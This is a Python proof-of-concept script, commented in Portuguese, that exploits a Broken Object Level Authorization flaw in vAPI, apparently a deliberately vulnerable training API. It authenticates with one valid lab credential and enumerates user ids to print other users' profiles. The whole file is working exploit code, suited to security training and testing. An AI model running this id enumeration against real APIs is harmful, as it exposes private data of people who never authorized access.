#!/usr/bin/env python3
"""
PoC - Vulnerabilidade 1: Broken Object Level Authorization (API1:2023)
Endpoint: GET /vapi/api1/user/{id}
Alvo: vAPI (https://github.com/roottusk/vapi)

A API apenas confirma que o par usuario:senha enviado no header
"Authorization-Token" existe na base (ver API1UsersController@show,
linha 18), mas nunca verifica se o {id} pedido na URL pertence a esse
usuario (linha 22: `return API1Users::find($id);`).

Este script autentica com UMA UNICA credencial valida e enumera varios
ids, provando que e possivel ler perfis de outros usuarios (BOLA/IDOR).

Uso:
    pip install requests
    python3 poc_bola_get_user.py --url http://localhost:8000/vapi \\
        --username jimhalp --password 'ag4|YY~`M=Gk' --range 1 10
"""
import argparse
import base64
import sys

import requests


def build_token(username: str, password: str) -> str:
    raw = f"{username}:{password}".encode()
    return base64.b64encode(raw).decode()


def exploit(base_url: str, username: str, password: str, id_start: int, id_end: int):
    token = build_token(username, password)
    headers = {"Authorization-Token": token}

    print(f"[*] Autenticado como '{username}' (token Authorization-Token: {token})")
    print(f"[*] Varrendo ids {id_start}..{id_end} em GET {base_url}/api1/user/<id>\n")

    found = []
    for uid in range(id_start, id_end + 1):
        url = f"{base_url}/api1/user/{uid}"
        try:
            resp = requests.get(url, headers=headers, timeout=5)
        except requests.RequestException as exc:
            print(f"[!] id={uid}: erro de conexao ({exc})")
            continue

        if resp.status_code == 200 and resp.text.strip() not in ("", "null"):
            print(f"[+] id={uid} -> 200 OK (vazou perfil de OUTRO usuario)")
            print(f"    {resp.text}")
            found.append((uid, resp.json() if resp.headers.get("content-type", "").startswith("application/json") else resp.text))
        else:
            print(f"[-] id={uid} -> {resp.status_code} (vazio/nao encontrado)")

    print("\n[*] Resumo do BOLA:")
    if found:
        print(f"    {len(found)} perfil(is) de OUTROS usuarios foram lidos com uma unica credencial.")
        for uid, data in found:
            print(f"    - id {uid}: {data}")
    else:
        print("    Nenhum id adicional respondeu. Confira a faixa de ids ou se a API esta de pe.")

    return found


def main():
    parser = argparse.ArgumentParser(description="PoC BOLA - GET /api1/user/{id} (vAPI)")
    parser.add_argument("--url", default="http://localhost:8000/vapi", help="Base URL da API, SEM o endpoint (ex: http://localhost:8000/vapi). O prefixo real de rotas do vAPI e /vapi, nao /api -- confira com 'php artisan route:list' dentro do container se tiver duvida.")
    parser.add_argument("--username", required=True, help="Usuario valido qualquer (ex: jimhalp)")
    parser.add_argument("--password", required=True, help="Senha desse usuario")
    parser.add_argument("--range", nargs=2, type=int, default=[1, 10], metavar=("INICIO", "FIM"))
    args = parser.parse_args()

    found = exploit(args.url.rstrip("/"), args.username, args.password, args.range[0], args.range[1])
    sys.exit(0 if found else 1)


if __name__ == "__main__":
    main()
